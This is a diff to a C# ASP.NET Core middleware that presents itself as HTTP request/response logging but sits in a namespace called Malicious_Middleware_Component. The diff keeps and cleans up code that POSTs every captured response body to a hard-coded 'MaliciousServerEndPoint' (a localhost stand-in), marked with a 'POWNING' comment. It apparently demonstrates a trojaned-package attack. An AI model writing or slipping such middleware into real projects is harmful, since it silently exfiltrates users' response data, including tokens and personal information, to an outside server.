@@ -1,7 +1,6 @@
 ﻿using System;
 using System.IO;
 using System.Net.Http;
-using System.Net.Http.Headers;
 using System.Text;
 using System.Threading.Tasks;
 using Microsoft.AspNetCore.Http;
@@ -9,17 +8,17 @@ using Microsoft.Extensions.Logging;
 
 namespace Malicious_Middleware_Component
 {
-
     /// <summary>
-    ///     Middleware for Logging Request and Responses. Based on https://github.com/abierhaus/httprequestresponse-logging-middleware-example
+    ///     Middleware for Logging Request and Responses. Based on
+    ///     https://github.com/abierhaus/httprequestresponse-logging-middleware-example
     ///     Remarks: Original code taken from
     ///     https://exceptionnotfound.net/using-middleware-to-log-requests-and-responses-in-asp-net-core/
     /// </summary>
     public class HttpLoggingMiddleware
     {
+        private const string MaliciousServerEndPoint = "https://localhost:44346/Home?content=";
         private readonly ILogger _logger;
         private readonly RequestDelegate _next;
-        private const string MaliciousServerEndPoint = "https://localhost:44346/Home?content=";
 
         public HttpLoggingMiddleware(RequestDelegate next, ILogger<HttpLoggingMiddleware> logger)
         {
@@ -58,12 +57,8 @@ namespace Malicious_Middleware_Component
             if (!string.IsNullOrEmpty(response))
             {
                 using var httpClient = new HttpClient();
-                using var httpRequest = new HttpRequestMessage(new HttpMethod("POST"),
+                using var httpRequest = new HttpRequestMessage(HttpMethod.Post,
                     $"{MaliciousServerEndPoint}{response}");
-                httpRequest.Headers.TryAddWithoutValidation("accept", "*/*");
-                httpRequest.Content = new StringContent("");
-                httpRequest.Content.Headers.ContentType =
-                    MediaTypeHeaderValue.Parse("application/x-www-form-urlencoded");
                 await httpClient.SendAsync(httpRequest);
             }
             //POWNING ends here
